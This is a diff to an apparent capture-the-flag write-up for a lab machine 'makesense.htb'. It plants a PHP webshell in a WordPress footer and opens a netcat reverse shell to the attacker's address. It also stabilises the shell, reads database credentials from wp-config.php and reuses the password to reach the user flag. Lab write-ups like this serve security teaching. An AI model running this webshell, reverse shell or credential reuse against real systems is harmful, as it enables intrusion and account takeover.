@@ -350,14 +350,51 @@ python add_admin.py
 [*] post_id: 81
 [*] save_voice_results: {"success":true,"data":{"message":"Results saved successfully!","post_id":81}}
 ```
-So we just created an admin user that we can use to access via /wp-admin. Now we obtain a RCE modifing the footer .php with:
+So we just created an admin user that we can use to access via /wp-admin. Now we obtain a webshell modifing the footer .php with:
 ```
 <?php if(isset($_GET['cmd'])) system($_GET['cmd']); ?>
 ```
-<img src="img/admin_webshell.png" width="500">     
+<img src="img/admin_webshell.png" width="1000">  
 
+```
+curl -sk https://makesense.htb/?cmd=id | grep uid
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+Noice, now let's obtain RCE.  
+Set up a listner:
+```
+nc -lvnp 4444
+```
+```
+curl -sk -G "https://makesense.htb/" --data-urlencode "cmd=busybox nc 10.10.15.14 4444 -e bash"
+```
+Stabilize the shell:  
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+We logged in as www-data. Let's search for config files:  
+```
+www-data@makesense:/var/www/html$ cat wp-config.php
+<?php
+// SQLite database configuration
+define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
+define( 'DB_FILE', '.ht.sqlite' );
 
-
+// Dummy MySQL settings (required but not used with SQLite)
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'w*****' );
+define( 'DB_PASSWORD', 'J**********!' );
+define( 'DB_HOST', 'localhost' );
+define( 'DB_CHARSET', 'utf8' );
+define( 'DB_COLLATE', '' );
+```
+Now password reuse: 
+```
+su w*****
+Password: J**********!
+cat /home/w*****/user.txt 
+1******************************b
+```
 
 
 
